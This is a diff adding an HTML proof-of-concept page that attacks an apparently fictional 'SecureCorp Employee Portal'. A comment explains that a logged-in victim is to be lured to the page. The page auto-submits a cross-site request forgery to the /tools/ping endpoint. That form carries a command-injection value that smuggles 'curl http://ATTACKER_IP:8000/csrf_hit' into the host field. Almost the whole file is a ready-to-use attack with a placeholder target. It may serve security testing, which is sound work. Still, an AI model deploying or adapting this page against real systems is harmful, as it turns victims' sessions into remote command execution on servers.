@@ -1,0 +1,23 @@
+<!doctype html>
+<!--
+  CSRF proof-of-concept for SecureCorp Employee Portal.
+  Host this file anywhere (even file:// locally) and get a logged-in
+  victim to open it. Their browser will auto-submit a POST to the
+  portal's /tools/ping endpoint using their OWN session cookie -- no
+  anti-CSRF token exists anywhere in the app to stop it.
+
+  Chained with VULN #1 (command injection), this single auto-submitting
+  form becomes "visit a webpage" -> "victim's browser runs a command on
+  the server as whichever user is logged in".
+
+  Change TARGET below to your target's address before using.
+-->
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://TARGET:5000/tools/ping" method="POST">
+    <input type="hidden" name="host" value="127.0.0.1; curl http://ATTACKER_IP:8000/csrf_hit">
+  </form>
+  <p>If you can read this, the auto-submit didn't fire -- click the button.</p>
+  <button onclick="document.forms[0].submit()">Go</button>
+</body>
+</html>
